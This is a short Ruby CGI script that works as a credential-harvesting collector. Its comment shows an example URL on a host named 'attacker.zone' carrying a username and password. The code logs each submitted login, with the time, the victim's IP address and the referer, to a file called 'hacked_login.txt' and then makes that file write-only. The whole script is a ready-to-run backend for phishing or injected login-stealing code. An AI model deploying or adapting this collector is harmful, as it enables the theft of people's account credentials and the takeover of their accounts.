#!/usr/bin/ruby -w

# http://attacker.zone/info.rb?user=sss@sss.com&pass=P@ssw0rd

require 'cgi'
require 'uri'

cgi  = CGI.new
user = URI.encode cgi['user']
pass = URI.encode cgi['pass']
time = Time.now.strftime("%D %T")

file = 'hacked_login.txt'
File.open(file, "a") do |f| 
   f.puts time
   f.puts "#{URI.decode user}:#{URI.decode pass}"
   f.puts cgi.remote_addr
   f.puts cgi.referer
   f.puts "---------------------------"
end
File.chmod(0200, file)

cgi.header  # content type 'text/html'
